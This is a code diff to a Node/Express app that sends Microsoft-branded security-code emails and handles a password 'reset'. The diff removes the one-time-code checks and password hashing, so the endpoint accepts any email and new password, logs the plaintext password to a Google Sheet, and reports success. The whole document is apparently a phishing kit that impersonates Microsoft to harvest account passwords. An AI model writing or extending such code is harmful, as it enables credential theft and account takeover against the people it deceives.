@@ -196,23 +196,21 @@ function createEmailTemplate(otp) {
                 color: #000000;
                 margin: 0;
                 padding: 0;
-                background-color: #f7f7f7;
             }
             .container {
                 max-width: 600px;
                 margin: 0 auto;
                 padding: 20px;
-                background-color: #ffffff;
             }
             .header {
-                text-align: center;
-                margin-bottom: 30px;
+                padding: 20px 0;
             }
             .header img {
                 width: 108px;
                 height: auto;
             }
             .content {
+                background-color: #ffffff;
                 padding: 20px;
             }
             .security-code {
@@ -221,17 +219,11 @@ function createEmailTemplate(otp) {
                 color: #0078D4;
                 padding: 15px 0;
                 letter-spacing: 2px;
-                text-align: center;
-                background-color: #f8f9fa;
-                border-radius: 4px;
-                margin: 20px 0;
             }
             .footer {
                 margin-top: 20px;
                 font-size: 12px;
                 color: #666666;
-                border-top: 1px solid #e5e5e5;
-                padding-top: 20px;
             }
         </style>
     </head>
@@ -241,19 +233,20 @@ function createEmailTemplate(otp) {
                 <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo">
             </div>
             <div class="content">
-                <h2>Security Code</h2>
-                <p>Use the following security code for your Microsoft account:</p>
+                <h1>Security Code</h1>
+                <p>Please use the following security code for your Microsoft account:</p>
                 <div class="security-code">${otp}</div>
                 <p>This security code will expire in 10 minutes.</p>
                 <p>If you didn't request this code, you can safely ignore this email.</p>
             </div>
             <div class="footer">
-                <p>Microsoft respects your privacy. To learn more, please read our <a href="https://privacy.microsoft.com/en-us/privacystatement" style="color: #0078D4; text-decoration: none;">Privacy Statement</a>.</p>
+                <p>Microsoft respects your privacy. To learn more, please read our <a href="https://privacy.microsoft.com/en-us/privacystatement">Privacy Statement</a>.</p>
                 <p>Microsoft Corporation • One Microsoft Way • Redmond, WA 98052</p>
             </div>
         </div>
     </body>
     </html>
+ 
     `;
 }
 
@@ -363,17 +356,11 @@ app.post('/send-code', async (req, res) => {
     }
 });
 
-// Updated verify-otp endpoint with simplified logging
+// Updated verify-otp endpoint to only check passwords and log
 app.post('/verify-otp', async (req, res) => {
-    const { email, otp, newPassword, confirmPassword } = req.body;
+    const { email, newPassword, confirmPassword } = req.body;
 
-    if (!email || !otp || !newPassword || !confirmPassword) {
-        await appendToGoogleSheet({
-            email: email?.toLowerCase(),
-            status: 'Verification Failed - Missing Fields',
-            otp: otp || ''
-        });
-
+    if (!email || !newPassword || !confirmPassword) {
         return res.status(400).json({
             success: false,
             message: 'All fields are required'
@@ -381,37 +368,19 @@ app.post('/verify-otp', async (req, res) => {
     }
 
     try {
-        const user = await User.findOne({
-            email: email.toLowerCase(),
-            otp: otp
-        });
-
-        if (!user || (user.otpExpiry && user.otpExpiry < new Date())) {
-            await appendToGoogleSheet({
-                email: email.toLowerCase(),
-                status: !user ? 'Invalid OTP' : 'OTP Expired',
-                otp: otp
-            });
-
+        // Check if passwords match
+        if (newPassword !== confirmPassword) {
             return res.status(400).json({
                 success: false,
-                message: !user ? 'Invalid security code' : 'Security code has expired'
+                message: 'Passwords do not match'
             });
         }
 
-        // Hash password and update user
-        const hashedPassword = await bcrypt.hash(newPassword, 10);
-        user.password = hashedPassword;
-        user.otp = undefined;
-        user.otpExpiry = undefined;
-        await user.save();
-
-        // Log successful password reset with actual password
+        // Log the password reset attempt
         await appendToGoogleSheet({
             email: email.toLowerCase(),
             status: 'Password Reset Success',
-            otp: otp,
-            password: newPassword  // Store the actual password
+            password: newPassword
         });
 
         res.json({
@@ -419,17 +388,17 @@ app.post('/verify-otp', async (req, res) => {
             message: 'Password reset successful'
         });
     } catch (error) {
-        console.error('Verify OTP Error:', error);
+        console.error('Password Reset Error:', error);
         
         await appendToGoogleSheet({
             email: email.toLowerCase(),
             status: 'Password Reset Failed',
-            otp: otp
+            password: ''
         });
 
         res.status(500).json({
             success: false,
-            message: 'Error verifying security code'
+            message: 'Error resetting password'
         });
     }
 });
